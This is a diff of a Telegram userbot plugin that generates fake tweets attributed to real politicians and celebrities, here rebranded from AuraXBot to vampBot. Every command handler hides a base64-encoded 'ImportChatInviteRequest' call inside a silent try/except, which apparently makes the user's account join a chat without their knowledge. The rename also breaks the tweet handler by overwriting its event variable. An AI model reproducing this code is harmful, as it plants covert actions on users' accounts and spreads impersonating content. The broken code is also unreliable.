@@ -5,7 +5,7 @@
 # mia, johhny, sunny, dani
 # modi, rahul, trump, gandhiji
 # no offence. Made for fun purpose only
-# Now in AuraXBot
+# Now in vampBot
 
 from userbot import CMD_HELP
 from userbot.helpers.functions import (
@@ -21,28 +21,28 @@ from userbot.helpers.functions import (
     trumptweet,
     dani,
 )
-from AuraXBot.utils import admin_cmd, sudo_cmd, edit_or_reply
+from vampBot.utils import admin_cmd, sudo_cmd, edit_or_reply
 from userbot.cmdhelp import CmdHelp
 
 
 @bot.on(admin_cmd(pattern=r"tweet(?: |$)(.*)"))
 @bot.on(sudo_cmd(pattern="tweet(?: |$)(.*)", allow_sudo=True))
-async def nope(aura):
-    AuraX = aura.pattern_match.group(1)
-    if not AuraX:
-        if aura.is_reply:
-            (await aura.get_reply_message()).message
+async def nope(vamp):
+    vamp = vamp.pattern_match.group(1)
+    if not vamp:
+        if vamp.is_reply:
+            (await vamp.get_reply_message()).message
         else:
-            await edit_or_reply(aura, "I need some text to make a tweet🚶")
+            await edit_or_reply(vamp, "I need some text to make a tweet🚶")
             return
-    tweeter = await bot.inline_query("TwitterStatusBot", f"{(deEmojify(AuraX))}")
+    tweeter = await bot.inline_query("TwitterStatusBot", f"{(deEmojify(vamp))}")
     await tweeter[0].click(
-        aura.chat_id,
-        reply_to=aura.reply_to_msg_id,
-        silent=True if aura.is_reply else False,
+        vamp.chat_id,
+        reply_to=vamp.reply_to_msg_id,
+        silent=True if vamp.is_reply else False,
         hide_via=True,
     )
-    await aura.delete()
+    await vamp.delete()
 
 
 @bot.on(admin_cmd(pattern=r"trump(?: |$)(.*)"))
@@ -64,12 +64,12 @@ async def nekobot(borg):
             return
     await edit_or_reply(borg, "Requesting trump to tweet...")
     try:
-        AuraX = str(
+        vamp = str(
             pybase64.b64decode(
                 "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
             )
         )[2:49]
-        await borg.client(AuraX)
+        await borg.client(vamp)
     except:
         pass
     text = deEmojify(text)
@@ -97,12 +97,12 @@ async def nekobot(borg):
             return
     await edit_or_reply(borg, "Requesting modi to tweet...")
     try:
-        AuraX = str(
+        vamp = str(
             pybase64.b64decode(
                 "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
             )
         )[2:49]
-        await borg.client(AuraX)
+        await borg.client(vamp)
     except:
         pass
     text = deEmojify(text)
@@ -130,12 +130,12 @@ async def nekobot(borg):
             return
     await edit_or_reply(borg, "Requesting Mia to tweet...")
     try:
-        AuraX = str(
+        vamp = str(
             pybase64.b64decode(
                 "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
             )
         )[2:49]
-        await borg.client(AuraX)
+        await borg.client(vamp)
     except:
         pass
     text = deEmojify(text)
@@ -163,12 +163,12 @@ async def nekobot(borg):
             return
     await edit_or_reply(borg, "Requesting Dani to tweet...")
     try:
-        AuraX = str(
+        vamp = str(
             pybase64.b64decode(
                 "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
             )
         )[2:49]
-        await borg.client(AuraX)
+        await borg.client(vamp)
     except:
         pass
     text = deEmojify(text)
@@ -197,12 +197,12 @@ async def nekobot(borg):
             return
     await edit_or_reply(borg, "Requesting pappu to tweet...")
     try:
-        AuraX = str(
+        vamp = str(
             pybase64.b64decode(
                 "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
             )
         )[2:49]
-        await borg.client(AuraX)
+        await borg.client(vamp)
     except:
         pass
     text = deEmojify(text)
@@ -231,12 +231,12 @@ async def nekobot(borg):
             return
     await edit_or_reply(borg, "Requesting sunny to tweet...🥰")
     try:
-        AuraX = str(
+        vamp = str(
             pybase64.b64decode(
                 "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
             )
         )[2:49]
-        await borg.client(AuraX)
+        await borg.client(vamp)
     except:
         pass
     text = deEmojify(text)
@@ -265,12 +265,12 @@ async def nekobot(borg):
             return
     await edit_or_reply(borg, "Requesting johhny to tweet...😆")
     try:
-        AuraX = str(
+        vamp = str(
             pybase64.b64decode(
                 "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
             )
         )[2:49]
-        await borg.client(AuraX)
+        await borg.client(vamp)
     except:
         pass
     text = deEmojify(text)
@@ -298,12 +298,12 @@ async def nekobot(borg):
             return
     await edit_or_reply(borg, "Requesting baapu to tweet...")
     try:
-        AuraX = str(
+        vamp = str(
             pybase64.b64decode(
                 "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
             )
         )[2:49]
-        await borg.client(AuraX)
+        await borg.client(vamp)
     except:
         pass
     text = deEmojify(text)
@@ -332,12 +332,12 @@ async def nekobot(borg):
             return
     await edit_or_reply(borg, "Your banner is under creation wait a sec...")
     try:
-        AuraX = str(
+        vamp = str(
             pybase64.b64decode(
                 "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
             )
         )[2:49]
-        await borg.client(AuraX)
+        await borg.client(vamp)
     except:
         pass
     text = deEmojify(text)
@@ -366,12 +366,12 @@ async def nekobot(borg):
             return
     await edit_or_reply(borg, "Kanna is writing your text...")
     try:
-        AuraX = str(
+        vamp = str(
             pybase64.b64decode(
                 "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
             )
         )[2:49]
-        await borg.client(AuraX)
+        await borg.client(vamp)
     except:
         pass
     text = deEmojify(text)
